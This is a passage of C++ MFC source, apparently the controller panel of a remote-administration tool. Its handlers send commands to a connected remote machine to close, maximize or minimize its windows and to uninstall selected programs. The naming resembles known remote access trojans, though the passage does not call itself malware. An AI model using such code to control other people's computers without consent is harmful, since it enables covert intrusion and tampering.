		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowClost() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_CLOSE;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowMax() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MAXIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowMin() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_MINIMIZE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemUninstall() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	
	if (MessageBox(_T("确定要卸载该程序?"), _T("提示"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;
	
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 4);
		
		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_APPUNINSTALL;
			memcpy(lpBuffer+1,str.GetBuffer(0),str.GetLength());
			m_iocpServer->Send(m_pContext,lpBuffer,str.GetLength() + 1,TRUE);
		}
	}
}